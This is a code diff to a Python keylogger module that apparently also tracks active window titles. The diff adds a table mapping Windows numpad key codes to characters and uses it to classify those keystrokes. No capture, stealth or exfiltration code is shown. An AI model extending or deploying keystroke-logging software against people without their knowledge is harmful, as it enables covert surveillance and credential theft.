@@ -22,6 +22,7 @@ Key exports:
   WindowTracker   - Active window title lookup across three OS platforms
   KeyType         - Enum categorizing keystrokes as CHAR, SPECIAL, or UNKNOWN
   SPECIAL_KEYS    - Dict mapping pynput Key values to their display labels
+  NUMPAD_KEYS     - Dict mapping Windows numpad virtual key codes to characters
 """
 
 import subprocess
@@ -93,6 +94,26 @@ SPECIAL_KEYS: dict[Key,
                        Key.left: "[LEFT]",
                        Key.right: "[RIGHT]",
                    }
+
+NUMPAD_KEYS: dict[int,
+                  str] = {
+                      0x60: "0",
+                      0x61: "1",
+                      0x62: "2",
+                      0x63: "3",
+                      0x64: "4",
+                      0x65: "5",
+                      0x66: "6",
+                      0x67: "7",
+                      0x68: "8",
+                      0x69: "9",
+                      0x6A: "*",
+                      0x6B: "+",
+                      0x6C: ",",
+                      0x6D: "-",
+                      0x6E: ".",
+                      0x6F: "/",
+                  }
 
 
 class KeyType(Enum):
@@ -422,6 +443,11 @@ class Keylogger:
 
         if hasattr(key, 'char') and key.char:
             return key.char, KeyType.CHAR
+
+        vk = getattr(key, 'vk', None)
+        numpad_char = NUMPAD_KEYS.get(vk) if vk is not None else None
+        if numpad_char:
+            return numpad_char, KeyType.CHAR
 
         return "[UNKNOWN]", KeyType.UNKNOWN
 
